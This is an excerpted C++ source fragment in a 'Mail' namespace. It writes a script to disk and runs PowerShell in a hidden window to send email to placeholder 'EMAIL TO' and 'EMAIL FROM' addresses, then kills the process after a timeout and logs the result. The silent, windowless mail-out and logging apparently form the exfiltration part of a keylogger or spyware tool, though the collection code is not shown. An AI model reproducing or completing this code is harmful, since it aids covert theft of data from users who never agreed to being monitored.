...
namespace Mail
{
    ...
    #define X_EM_TO "<<<EMAIL TO>>>"
    #define X_EM_FROM "<<<EMAIL FROM>>>"
    ...
    bool CreateScript()
    {
        std::ofstream script(inout::path(true)+std::string(SCRIPT_NAME));
        if(!script)
            return false;
    ...
    {
        bool ok;
        ok = inout::mkdir(inout::path(true));
        if(!ok)
            return -1;

        std::string src_path = inout::path(true) + std::string(SCRIPT_NAME);
        ...
        SHELLEXECUTEINFO ShExecInfo = {0}; //stores info used by script runner
        ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
        ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;  //leaves process unclosed
        ShExecInfo.hwnd = NULL;  //no window to display
        ShExecInfo.lpVerb = "open"; //action to be performed --> open
        ShExecInfo.lpFile = "powershell";   //file to be opened (in cmd)
        ShExecInfo.lpParameters = param.c_str();   //parameters (in cmd)
        ShExecInfo.lpDirectory = NULL;
        ShExecInfo.nShow = SW_HIDE;  //hides the window
        ShExecInfo.hInstApp = NULL;  //stores error msg

        ok = (bool)ShellExecuteEx(&ShExecInfo); //script runner
        if(!ok)
            return -3;
        ...
        m_timer.setFunct([&]()  //lambda function c++
        {
            WaitForSingleObject(ShExecInfo.hProcess, 60000);
            GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
            if((int)exit_code == STILL_ACTIVE)
                TerminateProcess(ShExecInfo.hProcess, 100);
            HELPER::p_log_file("<From SendMail> Return code :" + HELPER::tostring((int)exit_code));
